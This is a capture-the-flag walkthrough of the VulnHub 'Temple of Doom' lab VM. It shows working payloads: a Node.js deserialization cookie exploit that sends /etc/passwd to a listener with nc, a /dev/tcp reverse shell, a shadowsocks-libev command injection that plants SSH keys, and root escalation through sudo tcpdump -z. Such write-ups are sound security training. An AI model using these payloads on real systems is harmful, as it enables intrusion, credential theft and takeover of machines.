# VULNIX

**URL: https://www.vulnhub.com/entry/temple-of-doom-1,243/**

### NMAP  
  
>Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-13 09:02 UTC  
>Nmap scan report for 192.168.111.3  
>Host is up (0.00044s latency).  
>Not shown: 998 closed ports  
>PORT    STATE SERVICE VERSION  
>22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)  
>| ssh-hostkey:   
>|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)  
>|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)  
>|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)  
>666/tcp open  http    Node.js Express framework  
>|_http-title: Site doesn't have a title (text/html; charset=utf-8).  
>MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)  
>Device type: general purpose  
>Running: Linux 3.X|4.X  
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
>OS details: Linux 3.2 - 4.9  
>Network Distance: 1 hop  


### FIRST STEP: HTTP Cookie  

When we access the http service of the server we get the following message: "Under Construction, Come Back Later!". But, the second request throws an exception.
Reading the output of the error we know that there's something wrong with the unserialization of the cookie. If we decode the cookie we get something like:  

>{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires**=":**Friday, 13 Oct 2018 00:00:00 GMT"}  

We see that there's an error in the json format. When we correct this we get a "Hello Admin" message.  

Searching a bit, we find these document:  

https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf  

With this information, and playing with the output, we edit the exploit to make it work. In order to make it easier, we create a script to encode the requests:  

root@kali:~# cat cookie.py   

>import sys  
>import base64  
>  
>COOKIE='{"rce":"test","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires":"Friday, 13 Oct 2018 00:00:00 GMT","username":"_$$ND_FUNC$$_function (){ require(\'child_process\').exec(\'cat /etc/passwd | nc 192.168.111.4 8888\', function(error, stdout, stderr) { console.log(stdout) }); }()"}'  
>  
>print base64.b64encode(COOKIE)  


With this cookie, we make a request to the server:  

>root@kali:~# curl -H "Cookie: profile=$(python cookie.py)" "http://192.168.111.3:666/"  

And we get the content of /etc/passwd:  

root@kali:~# nc -nvlp 8888  
>listening on [any] 8888 ...  
>connect to [192.168.111.4] from (UNKNOWN) [192.168.111.3] 41624  
>root:x:0:0:root:/root:/bin/bash  
>...  
>nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash  
>fireman:x:1002:1002::/home/fireman:/bin/bash  

Now, let's get our reverse shell. With the following code:  
  
>"_$$ND_FUNC$$_function (){ require(\'child_process\').exec(\'/bin/bash -i >& /dev/tcp/192.168.111.4/8888 0>&1 \', function(error, stdout, stderr) { console.log(stdout) }); }()"  

We get our shell. But the first thing is getting an interactive shell, so let's exchange SSH keys and open a proper shell.  

root@kali:~# nc -nvlp 8888  
>listening on [any] 8888 ...  
>connect to [192.168.111.4] from (UNKNOWN) [192.168.111.3] 41628  
>bash: cannot set terminal process group (806): Inappropriate ioctl for device  
>bash: no job control in this shell  
>[nodeadmin@localhost ~]$   
>[nodeadmin@localhost ~]$ uname -a  
>Linux localhost.localdomain 4.16.3-301.fc28.x86_64 #1 SMP Mon Apr 23 21:59:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
>[nodeadmin@localhost ~]$ mkdir .ssh  
>[nodeadmin@localhost ~]$ chmod 700 .ssh  
>[nodeadmin@localhost ~]$ chmod 600 .ssh/authorized_keys  
>[nodeadmin@localhost ~]$ echo 'ssh-rsa AAAA...jf root@kali' > /home/nodeadmin/.ssh/authorized_keys  

Now we can login via SSH without being asked for the password.  

After trying harder, and harder... we look for stuff from the other user in the system until we find something interesting:  

[nodeadmin@localhost ~]$ grep -riI fireman /etc/  
>/etc/rc.d/rc.local:#su fireman -c /usr/local/bin/ss-manager  

We run "/usr/local/bin/ss-manager --help" and read that it's "shadowsocks-libev 3.1.0". Looking for info about this binary we find the following:  

https://www.x41-dsec.de/lab/advisories/x41-2017-010-shadowsocks-libev/  

There's a RCE vulnerability with this version. So after a lot of tests, we end up changing our crontab and adding the following line:  

[nodeadmin@localhost ~]$ crontab -l
>@reboot /bin/node /home/nodeadmin/.web/server.js &  
>**@reboot su fireman -c /usr/local/bin/ss-manager**  

We reboot the machine and find another port open, where it's running the ss-manager. So, we exploit this vulnerability to gain access as **fireman**:  

[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839  
>add: {"server_port":8003, "password":"test", "method":"||echo 'ssh-rsa AAAA...jf root@kali' > /home/fireman/.ssh/authorized_keys"}**ok**  

And we get an OK. So now, we can login with fireman through SSH. Let's explore this way. Quickly we find that fireman can execute some stuff as root:

[fireman@localhost ~]$ sudo -l  
>Matching Defaults entries for fireman on localhost:  
>    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1  
>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT  
>    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL  
>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",  
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
>  
>User fireman may run the following commands on localhost:  
>    (ALL) NOPASSWD: /sbin/iptables  
>    (ALL) NOPASSWD: /usr/bin/nmcli  
>    (ALL) NOPASSWD: /usr/sbin/tcpdump  


nmcli? Where have I heard that before? **CVE-2018-1111**. And judging by the iptables config, it makes sense that we have to disable it first to exploit this vulnerability.  

[fireman@localhost ~]$ sudo iptables -L  
>Chain INPUT (policy ACCEPT)  
>target     prot opt source               destination           
>DROP       udp  --  anywhere             anywhere             udp spt:bootps dpt:bootpc  
>  
>Chain FORWARD (policy ACCEPT)  
>target     prot opt source               destination           
>  
>Chain OUTPUT (policy ACCEPT)  
>target     prot opt source               destination    

Here is a demo:

https://twitter.com/Barknkilic/status/996470756283486209  

But, let's explore another way. Why tcpdump? Reading the man page, we see some interesing flags: "[ -z postrotate-command ] [ -Z user ]"  

Let's try this. Creating a small script to do the same as before:  

[fireman@localhost ~]$ cat RCE  
>#/bin/bash  
>echo 'ssh-rsa AAA...zdzjf root@kali' > /root/.ssh/authorized_keys  

And executing it after a 1 second of capture.   

[fireman@localhost ~]$ sudo tcpdump -i eth0 -G 1 -z ./RCE -Z root  

Bingo, that was one way. Now we can login as root and read the flag:  

root@kali:~# ssh -l root 192.168.111.3  
>Last failed login: Sat Jul 14 15:06:59 EDT 2018  
>There were 3 failed login attempts since the last successful login.  
>Last login: Thu Jun  7 23:14:57 2018 from 192.168.2.15  
>[root@localhost ~]# id  
>uid=0(root) gid=0(root) groups=0(root)  
>[root@localhost ~]# ls -lrth  
>total 4.0K  
>-rw-r--r-- 1 root root 2.0K Jun  7 23:16 flag.txt  
